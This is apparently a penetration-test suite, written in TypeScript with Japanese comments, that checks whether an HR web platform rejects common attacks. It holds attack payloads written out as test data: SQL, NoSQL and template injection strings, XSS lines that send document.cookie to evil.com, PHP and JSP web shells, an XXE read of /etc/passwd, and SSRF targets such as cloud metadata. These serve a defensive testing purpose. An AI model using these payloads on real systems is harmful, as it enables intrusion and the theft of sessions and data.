import { describe, it, expect, beforeAll } from 'vitest';
import axios from 'axios';
import { JSDOM } from 'jsdom';
import * as puppeteer from 'puppeteer';

/**
 * ペネトレーションテストシナリオ
 * 実際の攻撃手法を用いたセキュリティテスト
 * 
 * 注意: このテストは専用のテスト環境でのみ実行すること
 */
describe('ペネトレーションテストシナリオ', () => {
  const baseUrl = process.env.PENTEST_URL || 'https://test.ai-hr-platform.jp';
  const apiUrl = `${baseUrl}/api/v1`;
  let browser: puppeteer.Browser;
  let page: puppeteer.Page;

  beforeAll(async () => {
    // Puppeteerブラウザ初期化
    browser = await puppeteer.launch({
      headless: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox']
    });
    page = await browser.newPage();
  });

  afterAll(async () => {
    await browser.close();
  });

  describe('認証・セッション管理の脆弱性', () => {
    it('セッション固定攻撃（Session Fixation）', async () => {
      // 攻撃者が設定したセッションIDでログイン試行
      const fixedSessionId = 'attacker-session-id-12345';
      
      await page.setCookie({
        name: 'sessionId',
        value: fixedSessionId,
        domain: new URL(baseUrl).hostname
      });
      
      // ログインページへアクセス
      await page.goto(`${baseUrl}/login`);
      
      // ログイン実行
      await page.type('#email', 'test@example.com');
      await page.type('#password', 'TestPassword123!');
      await page.click('#login-button');
      await page.waitForNavigation();
      
      // ログイン後のセッションIDを確認
      const cookies = await page.cookies();
      const sessionCookie = cookies.find(c => c.name === 'sessionId');
      
      expect(sessionCookie?.value).not.toBe(fixedSessionId);
    });

    it('JWT改ざん攻撃', async () => {
      // 通常のログインでJWTトークン取得
      const loginRes = await axios.post(`${apiUrl}/auth/login`, {
        email: 'employee@example.com',
        password: 'TestPassword123!'
      });
      
      const originalToken = loginRes.data.access_token;
      
      // JWTをデコードして改ざん
      const [header, payload, signature] = originalToken.split('.');
      const decodedPayload = JSON.parse(Buffer.from(payload, 'base64').toString());
      
      // 権限を昇格させる試み
      decodedPayload.role = 'admin';
      decodedPayload.permissions = ['*'];
      
      const tamperedPayload = Buffer.from(JSON.stringify(decodedPayload)).toString('base64');
      const tamperedToken = `${header}.${tamperedPayload}.${signature}`;
      
      // 改ざんしたトークンでAPIアクセス
      try {
        await axios.get(`${apiUrl}/admin/users`, {
          headers: { Authorization: `Bearer ${tamperedToken}` }
        });
        expect(true).toBe(false); // 成功してはいけない
      } catch (error) {
        expect(error.response.status).toBe(401);
        expect(error.response.data.error).toContain('Invalid token');
      }
    });

    it('パスワードリセットトークンの推測', async () => {
      // パスワードリセット要求
      const resetRes = await axios.post(`${apiUrl}/auth/reset-password`, {
        email: 'test@example.com'
      });
      
      // トークンの推測試行（時間ベース）
      const baseTime = Date.now();
      const attempts = [];
      
      for (let i = -10; i <= 10; i++) {
        const guessedToken = generatePredictableToken(baseTime + i * 1000);
        attempts.push(
          axios.post(`${apiUrl}/auth/reset-password/confirm`, {
            token: guessedToken,
            newPassword: 'HackedPassword123!'
          }).catch(e => e.response)
        );
      }
      
      const results = await Promise.all(attempts);
      const successfulAttempts = results.filter(r => r && r.status === 200);
      
      expect(successfulAttempts.length).toBe(0);
    });
  });

  describe('インジェクション攻撃', () => {
    it('SQLインジェクション - Union Based', async () => {
      const payloads = [
        "' UNION SELECT null,null,null--",
        "' UNION SELECT id,email,password FROM users--",
        "1' OR '1'='1'--",
        "'; DROP TABLE employees;--"
      ];
      
      for (const payload of payloads) {
        try {
          const res = await axios.get(`${apiUrl}/employees/search`, {
            params: { name: payload }
          });
          
          // レスポンスにエラー情報や追加データが含まれていないことを確認
          expect(res.data).not.toContain('users');
          expect(res.data).not.toContain('password');
          expect(res.data).not.toContain('error');
        } catch (error) {
          // エラーの場合も情報漏洩がないことを確認
          expect(error.response.data).not.toContain('SQL');
          expect(error.response.data).not.toContain('syntax');
        }
      }
    });

    it('NoSQLインジェクション - MongoDB', async () => {
      const payloads = [
        { $ne: null },
        { $gt: '' },
        { $where: 'this.password.match(/.*/)' },
        { email: { $regex: '.*', $options: 'i' } }
      ];
      
      for (const payload of payloads) {
        try {
          const res = await axios.post(`${apiUrl}/auth/login`, {
            email: payload,
            password: 'anything'
          });
          
          expect(res.status).not.toBe(200);
        } catch (error) {
          expect(error.response.status).toBe(400);
        }
      }
    });

    it('XPath インジェクション', async () => {
      const payloads = [
        "' or '1'='1",
        "'] | //user[role='admin'] | //['"
      ];
      
      for (const payload of payloads) {
        try {
          const res = await axios.get(`${apiUrl}/config/setting`, {
            params: { path: payload }
          });
          
          expect(res.data).not.toContain('admin');
          expect(res.data).not.toContain('password');
        } catch (error) {
          expect(error.response.status).toBe(400);
        }
      }
    });

    it('テンプレートインジェクション', async () => {
      const payloads = [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '{{config.items()}}',
        '{{self.__class__.__mro__[1].__subclasses__()}}'
      ];
      
      for (const payload of payloads) {
        const res = await axios.post(`${apiUrl}/reports/generate`, {
          template: 'custom',
          data: { name: payload }
        });
        
        // 計算結果や内部情報が含まれていないことを確認
        expect(res.data).not.toContain('49');
        expect(res.data).not.toContain('class');
        expect(res.data).not.toContain('config');
      }
    });
  });

  describe('クロスサイトスクリプティング（XSS）', () => {
    it('反射型XSS', async () => {
      const xssPayloads = [
        '<script>alert(document.cookie)</script>',
        '<img src=x onerror="fetch(`//evil.com?c=${document.cookie}`)">',
        '<svg onload=alert(1)>',
        'javascript:alert(1)',
        '<input onfocus=alert(1) autofocus>'
      ];
      
      for (const payload of xssPayloads) {
        await page.goto(`${baseUrl}/search?q=${encodeURIComponent(payload)}`);
        
        // アラートが表示されないことを確認
        let alertFired = false;
        page.on('dialog', async dialog => {
          alertFired = true;
          await dialog.dismiss();
        });
        
        await page.waitForTimeout(1000);
        expect(alertFired).toBe(false);
        
        // ペイロードがエスケープされていることを確認
        const content = await page.content();
        expect(content).not.toContain('<script>');
        expect(content).not.toContain('onerror=');
      }
    });

    it('格納型XSS', async () => {
      const xssPayload = '<script>fetch(`//evil.com?c=${document.cookie}`)</script>';
      
      // XSSペイロードを含むプロフィール更新
      await axios.put(`${apiUrl}/profile`, {
        bio: xssPayload
      }, {
        headers: { Authorization: `Bearer ${await getAuthToken()}` }
      });
      
      // 別のユーザーとしてプロフィールを閲覧
      await page.goto(`${baseUrl}/profile/user123`);
      
      // ネットワークリクエストを監視
      const maliciousRequests = [];
      page.on('request', request => {
        if (request.url().includes('evil.com')) {
          maliciousRequests.push(request);
        }
      });
      
      await page.waitForTimeout(2000);
      expect(maliciousRequests.length).toBe(0);
    });

    it('DOM Based XSS', async () => {
      await page.goto(`${baseUrl}/dashboard`);
      
      // URLフラグメントを使用したXSS試行
      await page.evaluate(() => {
        window.location.hash = '#<img src=x onerror=alert(1)>';
      });
      
      await page.waitForTimeout(1000);
      
      // DOMに危険な要素が挿入されていないことを確認
      const imgElements = await page.$$('img[src="x"]');
      expect(imgElements.length).toBe(0);
    });
  });

  describe('クロスサイトリクエストフォージェリ（CSRF）', () => {
    it('状態変更操作のCSRF保護', async () => {
      // 正規ユーザーとしてログイン
      const authToken = await getAuthToken();
      
      // CSRFトークンなしでの重要な操作
      try {
        await axios.post(`${apiUrl}/employees/salary/update`, {
          employeeId: 'emp001',
          newSalary: 1000000
        }, {
          headers: { 
            Authorization: `Bearer ${authToken}`,
            Origin: 'https://evil.com'
          }
        });
        
        expect(true).toBe(false); // 成功してはいけない
      } catch (error) {
        expect(error.response.status).toBe(403);
        expect(error.response.data.error).toContain('CSRF');
      }
    });

    it('SameSite Cookieの検証', async () => {
      await page.goto(`${baseUrl}/login`);
      await page.type('#email', 'test@example.com');
      await page.type('#password', 'TestPassword123!');
      await page.click('#login-button');
      await page.waitForNavigation();
      
      const cookies = await page.cookies();
      const sessionCookie = cookies.find(c => c.name === 'sessionId');
      
      expect(sessionCookie?.sameSite).toBe('Strict');
    });
  });

  describe('アクセス制御の脆弱性', () => {
    it('IDOR - 水平権限昇格', async () => {
      // 通常ユーザーとしてログイン
      const userToken = await getAuthToken('employee');
      
      // 他のユーザーのデータにアクセス試行
      const targetIds = ['emp002', 'emp003', '../admin', '../../root'];
      
      for (const id of targetIds) {
        try {
          const res = await axios.get(`${apiUrl}/payroll/${id}`, {
            headers: { Authorization: `Bearer ${userToken}` }
          });
          
          // 自分以外のデータにアクセスできないことを確認
          if (id !== 'emp001') {
            expect(true).toBe(false);
          }
        } catch (error) {
          expect(error.response.status).toBe(403);
        }
      }
    });

    it('強制ブラウジング', async () => {
      const sensitivePaths = [
        '/admin',
        '/api/v1/admin/logs',
        '/api/v1/debug',
        '/.env',
        '/config/database.yml',
        '/backup/dump.sql',
        '/.git/config'
      ];
      
      for (const path of sensitivePaths) {
        try {
          const res = await axios.get(`${baseUrl}${path}`);
          expect(res.status).not.toBe(200);
        } catch (error) {
          expect([401, 403, 404]).toContain(error.response.status);
        }
      }
    });

    it('権限昇格 - パラメータ汚染', async () => {
      const userToken = await getAuthToken('employee');
      
      // 複数のroleパラメータを送信
      try {
        await axios.post(`${apiUrl}/profile/update`, {
          name: 'Test User',
          role: 'employee',
          role: 'admin', // パラメータ汚染
          'role[]': ['admin', 'super_admin']
        }, {
          headers: { Authorization: `Bearer ${userToken}` }
        });
        
        // プロフィールを確認
        const profile = await axios.get(`${apiUrl}/profile`, {
          headers: { Authorization: `Bearer ${userToken}` }
        });
        
        expect(profile.data.role).toBe('employee');
        expect(profile.data.role).not.toBe('admin');
      } catch (error) {
        // エラーでも問題なし
      }
    });
  });

  describe('ビジネスロジックの脆弱性', () => {
    it('レースコンディション - 二重支出', async () => {
      const authToken = await getAuthToken();
      
      // 同時に複数の経費申請を送信
      const expenseRequests = Array(10).fill(null).map(() => 
        axios.post(`${apiUrl}/expenses/submit`, {
          amount: 10000,
          category: 'travel',
          description: 'Business trip'
        }, {
          headers: { Authorization: `Bearer ${authToken}` }
        }).catch(e => e.response)
      );
      
      const results = await Promise.all(expenseRequests);
      const successfulRequests = results.filter(r => r && r.status === 201);
      
      // 予算上限を超えていないことを確認
      const totalApproved = successfulRequests.reduce((sum, r) => sum + r.data.amount, 0);
      expect(totalApproved).toBeLessThanOrEqual(50000); // 予算上限
    });

    it('時間ベースの攻撃', async () => {
      // 有給休暇の二重取得試行
      const authToken = await getAuthToken();
      const leaveDate = '2025-08-15';
      
      // 短時間に同じ日付で複数の休暇申請
      const requests = [];
      for (let i = 0; i < 5; i++) {
        requests.push(
          axios.post(`${apiUrl}/leave/request`, {
            type: 'paid',
            date: leaveDate
          }, {
            headers: { Authorization: `Bearer ${authToken}` }
          }).catch(e => e.response)
        );
      }
      
      const results = await Promise.all(requests);
      const approved = results.filter(r => r && r.status === 201);
      
      expect(approved.length).toBe(1); // 1つのみ承認されるべき
    });

    it('整数オーバーフロー', async () => {
      const authToken = await getAuthToken('hr_admin');
      
      const overflowValues = [
        2147483647, // MAX_INT
        9223372036854775807, // MAX_BIGINT
        -2147483648, // MIN_INT
        '999999999999999999999999999'
      ];
      
      for (const value of overflowValues) {
        try {
          await axios.post(`${apiUrl}/payroll/bonus`, {
            employeeId: 'emp001',
            amount: value
          }, {
            headers: { Authorization: `Bearer ${authToken}` }
          });
          
          // 値が適切に処理されることを確認
          const payroll = await axios.get(`${apiUrl}/payroll/emp001`, {
            headers: { Authorization: `Bearer ${authToken}` }
          });
          
          expect(payroll.data.bonus).toBeGreaterThan(0);
          expect(payroll.data.bonus).toBeLessThan(1000000); // 妥当な範囲
        } catch (error) {
          expect(error.response.status).toBe(400);
        }
      }
    });
  });

  describe('ファイルアップロードの脆弱性', () => {
    it('悪意のあるファイルのアップロード', async () => {
      const authToken = await getAuthToken();
      const maliciousFiles = [
        { name: 'shell.php', content: '<?php system($_GET["cmd"]); ?>', type: 'image/jpeg' },
        { name: 'test.jsp', content: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', type: 'image/jpeg' },
        { name: 'exploit.svg', content: '<svg onload="alert(1)">', type: 'image/svg+xml' },
        { name: 'eicar.txt', content: 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*', type: 'text/plain' }
      ];
      
      for (const file of maliciousFiles) {
        const formData = new FormData();
        formData.append('file', new Blob([file.content], { type: file.type }), file.name);
        
        try {
          await axios.post(`${apiUrl}/upload/receipt`, formData, {
            headers: { 
              Authorization: `Bearer ${authToken}`,
              'Content-Type': 'multipart/form-data'
            }
          });
          
          // アップロードされたファイルが実行可能でないことを確認
          const uploadedFile = await axios.get(`${baseUrl}/uploads/${file.name}`);
          expect(uploadedFile.headers['content-type']).not.toContain('php');
          expect(uploadedFile.headers['content-disposition']).toContain('attachment');
        } catch (error) {
          expect([400, 415]).toContain(error.response.status);
        }
      }
    });

    it('ファイルサイズ制限の回避', async () => {
      const authToken = await getAuthToken();
      
      // Content-Lengthヘッダーの偽装
      try {
        const largeFile = Buffer.alloc(100 * 1024 * 1024); // 100MB
        const formData = new FormData();
        formData.append('file', new Blob([largeFile]), 'large.jpg');
        
        await axios.post(`${apiUrl}/upload/receipt`, formData, {
          headers: { 
            Authorization: `Bearer ${authToken}`,
            'Content-Length': '1024' // 偽装
          },
          maxContentLength: Infinity
        });
        
        expect(true).toBe(false); // 成功してはいけない
      } catch (error) {
        expect(error.response.status).toBe(413);
      }
    });
  });

  describe('API セキュリティ', () => {
    it('GraphQL イントロスペクションの無効化', async () => {
      const introspectionQuery = {
        query: `
          {
            __schema {
              types {
                name
                fields {
                  name
                  type {
                    name
                  }
                }
              }
            }
          }
        `
      };
      
      try {
        const res = await axios.post(`${apiUrl}/graphql`, introspectionQuery);
        expect(res.data.errors).toBeDefined();
      } catch (error) {
        expect(error.response.status).toBe(400);
      }
    });

    it('APIレート制限の検証', async () => {
      const requests = [];
      
      // 短時間に大量のリクエスト
      for (let i = 0; i < 150; i++) {
        requests.push(
          axios.get(`${apiUrl}/health`).catch(e => e.response)
        );
      }
      
      const results = await Promise.all(requests);
      const rateLimited = results.filter(r => r && r.status === 429);
      
      expect(rateLimited.length).toBeGreaterThan(0);
      
      // Rate limit headersの確認
      const limitedResponse = rateLimited[0];
      expect(limitedResponse.headers['x-ratelimit-limit']).toBeDefined();
      expect(limitedResponse.headers['x-ratelimit-remaining']).toBeDefined();
      expect(limitedResponse.headers['x-ratelimit-reset']).toBeDefined();
    });

    it('APIバージョニングの検証', async () => {
      // 古いAPIバージョンへのアクセス
      const oldVersions = ['/api/v0', '/api/v0.1', '/api/'];
      
      for (const version of oldVersions) {
        try {
          await axios.get(`${baseUrl}${version}/employees`);
          expect(true).toBe(false);
        } catch (error) {
          expect(error.response.status).toBe(404);
        }
      }
    });
  });

  describe('その他のセキュリティテスト', () => {
    it('XXE（XML External Entity）攻撃', async () => {
      const authToken = await getAuthToken();
      const xxePayload = `
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <root>
          <data>&xxe;</data>
        </root>
      `;
      
      try {
        const res = await axios.post(`${apiUrl}/import/xml`, xxePayload, {
          headers: { 
            Authorization: `Bearer ${authToken}`,
            'Content-Type': 'application/xml'
          }
        });
        
        expect(res.data).not.toContain('root:');
        expect(res.data).not.toContain('/bin/bash');
      } catch (error) {
        expect(error.response.status).toBe(400);
      }
    });

    it('SSRF（Server Side Request Forgery）', async () => {
      const authToken = await getAuthToken();
      const ssrfTargets = [
        'http://localhost:6379', // Redis
        'http://169.254.169.254/latest/meta-data/', // AWS metadata
        'file:///etc/passwd',
        'gopher://localhost:6379',
        'dict://localhost:11211'
      ];
      
      for (const target of ssrfTargets) {
        try {
          await axios.post(`${apiUrl}/webhook/test`, {
            url: target
          }, {
            headers: { Authorization: `Bearer ${authToken}` }
          });
          
          expect(true).toBe(false);
        } catch (error) {
          expect(error.response.status).toBe(400);
          expect(error.response.data.error).toContain('Invalid URL');
        }
      }
    });

    it('暗号化の強度検証', async () => {
      // TLS設定の確認
      const tlsInfo = await axios.get(`${baseUrl}/`, {
        httpsAgent: new (require('https').Agent)({
          secureOptions: require('constants').SSL_OP_NO_TLSv1_2
        })
      }).catch(e => e);
      
      // TLS 1.3が使用されていることを確認
      expect(tlsInfo.request.res.socket.getProtocol()).toBe('TLSv1.3');
    });
  });
});

// ヘルパー関数
async function getAuthToken(role: string = 'employee'): Promise<string> {
  const credentials = {
    employee: { email: 'employee@example.com', password: 'TestPassword123!' },
    hr_admin: { email: 'hr@example.com', password: 'AdminPassword123!' },
    admin: { email: 'admin@example.com', password: 'SuperAdmin123!' }
  };
  
  const res = await axios.post(`${process.env.PENTEST_URL}/api/v1/auth/login`, credentials[role]);
  return res.data.access_token;
}

function generatePredictableToken(timestamp: number): string {
  // 予測可能なトークン生成をシミュレート
  return require('crypto').createHash('md5').update(String(timestamp)).digest('hex');
}